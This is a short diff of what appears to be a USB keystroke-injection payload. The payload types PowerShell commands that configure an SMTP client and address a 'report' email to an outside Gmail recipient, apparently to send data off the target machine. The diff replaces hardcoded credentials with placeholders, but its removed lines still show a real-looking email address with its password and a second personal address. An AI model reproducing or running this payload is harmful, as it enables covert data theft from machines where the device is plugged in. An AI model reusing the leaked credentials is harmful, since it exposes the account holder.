@@ -55,7 +55,7 @@ STRING $SMTPInfo.EnableSsl = $true
 DELAY 500
 ENTER
 DELAY 500
-STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('crashbboy1@gmail.com', 'bboy21102012')
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('mail', 'password')
 DELAY 500
 ENTER
 DELAY 500
@@ -63,10 +63,10 @@ STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 DELAY 500
 ENTER
 DELAY 500
-STRING $ReportEmail.From = 'crashbboy1@gmail.com'
+STRING $ReportEmail.From = 'mail'
 ENTER
 DELAY 500
-STRING $ReportEmail.To.Add('joelsernamoreno@gmail.com')
+STRING $ReportEmail.To.Add('mail')
 DELAY 500
 ENTER
 DELAY 500
